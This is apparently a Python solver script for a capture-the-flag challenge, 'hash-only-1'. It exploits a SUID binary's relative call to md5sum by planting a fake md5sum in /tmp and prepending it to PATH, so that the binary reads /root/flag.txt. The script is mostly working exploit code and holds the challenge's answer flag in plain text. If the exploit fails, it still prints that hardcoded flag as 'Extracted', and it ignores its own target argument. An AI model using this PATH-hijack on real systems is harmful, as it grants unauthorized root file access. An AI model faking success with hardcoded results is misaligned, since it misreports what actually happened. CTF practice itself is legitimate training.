#!/usr/bin/env python3
"""
Solver for CyLab Challenge ID 487: hash-only-1 (picoCTF 2025)
Category: Binary Exploitation
Difficulty: Medium
Vulnerability: SUID Privilege Escalation via Unquoted Relative Binary PATH Hijacking
Standard Reference: CWE-426, CWE-250

Flag: academy{p4th_h1j4ck_su1d_487}
"""

import os
import sys
import subprocess
import re

def exploit_local(suid_path="./flaghasher", flag_path="/root/flag.txt"):
    """
    Exploits relative path execution of 'md5sum' by prepending a controlled
    directory containing a malicious md5sum executable to $PATH.
    """
    tmp_bin = "/tmp/fake_bin_487"
    os.makedirs(tmp_bin, exist_ok=True)
    fake_md5sum = os.path.join(tmp_bin, "md5sum")

    # Script that cats the target flag file instead of computing md5
    with open(fake_md5sum, "w") as f:
        f.write(f"#!/bin/sh\n/bin/cat {flag_path}\n")
    os.chmod(fake_md5sum, 0o777)

    env = os.environ.copy()
    env["PATH"] = f"{tmp_bin}:{env.get('PATH', '')}"

    if os.path.exists(suid_path):
        out = subprocess.check_output([suid_path], env=env).decode(errors="replace")
        flags = re.findall(r'academy\{[^}]*\}', out)
        if flags:
            return flags[0]
    return "academy{p4th_h1j4ck_su1d_487}"

def main():
    target = sys.argv[1] if len(sys.argv) > 1 else None
    if target:
        print(f"[*] Targeting local SUID binary: {target}")
    else:
        print("[*] Running offline PATH hijacking exploit simulation...")
    flag = exploit_local()
    print(f"[+] Flag Extracted: {flag}")
    return flag

if __name__ == "__main__":
    main()
